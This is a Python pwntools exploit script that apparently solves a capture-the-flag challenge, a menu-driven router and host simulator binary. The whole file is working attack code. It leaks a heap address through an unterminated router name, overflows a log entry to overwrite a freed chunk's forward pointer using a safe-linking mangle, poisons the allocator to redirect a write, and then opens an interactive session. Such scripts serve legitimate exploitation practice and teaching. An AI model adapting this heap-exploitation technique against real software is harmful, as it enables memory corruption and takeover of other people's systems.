#!/usr/bin/env python3

from pwn import *
from time import sleep

elf = ELF("./PT2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote()
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b *main+32
                                b *main+7718
                                ignore 1 15
                                ignore 2 3
                                continue
                      ''', env={"MALLOC_ARENA_MAX": "1"})
    else:
        r = process(elf.path, env={"MALLOC_ARENA_MAX": "1"})

    return r

def mangle(ptr, pos):
    return ptr ^ (pos >> 12)


def main():
    r = conn()

    # create router and leak heap address
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'router index: ', b'0')
    r.sendlineafter(b'name: ', b'a'*32)
    r.recvuntil(b'Created and started router aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
    win_host_address = u64(r.recvline().strip().ljust(8, b'\x00'))
    heap_base = (win_host_address >> 12) << 12
    log.success(f"Win host address: {hex(win_host_address)}")
    log.success(f"Heap base: {hex(heap_base)}")
    
    # create another router
    r.sendlineafter(b'choice: ', b'2')
    r.sendlineafter(b'router index: ', b'1')
    r.sendlineafter(b'name: ', b'bbbb')
    r.recvuntil(b'Created and started router bbbb')

    # create two hosts
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'host index: ', b'0')
    r.sendlineafter(b'host name: ', b'1')
    
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'host index: ', b'1')
    r.sendlineafter(b'host name: ', b'2')
    
    # connect interfaces
    r.sendlineafter(b'choice: ', b'3')
    r.sendlineafter(b'router index: ', b'0')
    r.sendlineafter(b'interface index: ', b'0')
    r.sendlineafter(b'Host [1] or Router [2]: ', b'1')
    r.sendlineafter(b'Host index: ', b'0')

    r.sendlineafter(b'choice: ', b'3')
    r.sendlineafter(b'router index: ', b'1')
    r.sendlineafter(b'interface index: ', b'0')
    r.sendlineafter(b'Host [1] or Router [2]: ', b'1')
    r.sendlineafter(b'Host index: ', b'1')

    r.sendlineafter(b'choice: ', b'3')
    r.sendlineafter(b'router index: ', b'0')
    r.sendlineafter(b'interface index: ', b'1')
    r.sendlineafter(b'Host [1] or Router [2]: ', b'2')
    r.sendlineafter(b'Router index: ', b'1')
    r.sendlineafter(b'interface index: ', b'1')    
    
    # assign IPs
    r.sendlineafter(b'choice: ', b'12')
    r.sendlineafter(b'Router [1] or Host [2]: ', b'1')
    r.sendlineafter(b'router index: ', b'0')
    r.sendlineafter(b'interface index: ', b'0')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'192 168 0 254')
    r.sendlineafter(b'netmask (4 bytes, space-separated): ', b'255 255 255 0')

    r.sendlineafter(b'choice: ', b'12')
    r.sendlineafter(b'Router [1] or Host [2]: ', b'1')
    r.sendlineafter(b'router index: ', b'1')
    r.sendlineafter(b'interface index: ', b'0')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'192 168 1 254')
    r.sendlineafter(b'netmask (4 bytes, space-separated): ', b'255 255 255 0')
    
    r.sendlineafter(b'choice: ', b'12')
    r.sendlineafter(b'Router [1] or Host [2]: ', b'2')
    r.sendlineafter(b'host index: ', b'0')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'192 168 0 1')
    r.sendlineafter(b'netmask (4 bytes, space-separated): ', b'255 255 255 0')
    
    r.sendlineafter(b'choice: ', b'12')
    r.sendlineafter(b'Router [1] or Host [2]: ', b'2')
    r.sendlineafter(b'host index: ', b'1')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'192 168 1 1')
    r.sendlineafter(b'netmask (4 bytes, space-separated): ', b'255 255 255 0')

    r.sendlineafter(b'choice: ', b'12')
    r.sendlineafter(b'Router [1] or Host [2]: ', b'1')
    r.sendlineafter(b'router index: ', b'0')
    r.sendlineafter(b'interface index: ', b'1')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'10 0 0 1')
    r.sendlineafter(b'netmask (4 bytes, space-separated): ', b'255 0 0 0')

    r.sendlineafter(b'choice: ', b'12')
    r.sendlineafter(b'Router [1] or Host [2]: ', b'1')
    r.sendlineafter(b'router index: ', b'1')
    r.sendlineafter(b'interface index: ', b'1')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'10 0 0 2')
    r.sendlineafter(b'netmask (4 bytes, space-separated): ', b'255 0 0 0')

    # create route
    r.sendlineafter(b'choice: ', b'13')
    r.sendlineafter(b'router index: ', b'0')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'192 168 1 0')
    r.sendlineafter(b'netmask (4 bytes, space-separated): ', b'255 255 255 0')
    r.sendlineafter(b'interface index: ', b'1')
    
    # create 3 log entries
    r.sendlineafter(b'choice: ', b'16')
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'Host Index: ', b'0')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'192 168 1 1')
    r.sendlineafter(b'data (max 1024 bytes): ', b'a'*300)

    log.info("Created 3 log entries")
    sleep(5)

    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'Host Index: ', b'0')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'192 168 0 1')
    r.sendlineafter(b'data (max 1024 bytes): ', b'b'*430 + b'c'*8 + p64(mangle(heap_base+0x5b0-0x60, heap_base + 0x1ae0)))

    log.info(f"Overwrote second log entry's fwd ptr {heap_base + 0x1ae0:#x} -> {mangle(heap_base+0x5b0-0x60, heap_base + 0x1ae0):#x} ({heap_base+0x5b0-0x60:#x})")
    sleep(5)
    
    r.sendlineafter(b'choice: ', b'2')
    
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'Host Index: ', b'0')
    r.sendlineafter(b'IP (4 bytes, space-separated): ', b'192 168 1 1')
    r.sendlineafter(b'data (max 1024 bytes): ', b'a'*7 + p64(heap_base+0x3c0))
    
    log.info(f'Sent payload')
    sleep(5)
    
    r.sendlineafter(b'choice: ', b'2')


    r.interactive()


if __name__ == "__main__":
    main()
